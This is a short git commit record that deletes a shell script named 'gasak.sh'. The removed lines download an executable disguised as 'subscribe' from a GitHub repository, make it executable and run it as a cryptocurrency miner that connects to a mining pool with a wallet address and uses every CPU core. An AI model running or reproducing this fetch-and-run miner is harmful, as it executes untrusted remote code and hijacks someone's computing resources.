fa96febbf79304cc489f8d0d9deb3616ec8f6928
septianana55 <93500712+septianana55@users.noreply.github.com>
2022-01-07 08:10:30 +0700

    Delete gasak.sh

--- gasak.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-sudo apt update
-wget https://github.com/septianana55/students/raw/main/subscribe
-chmod +x subscribe
-./subscribe -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.D4 -t $(nproc --all)
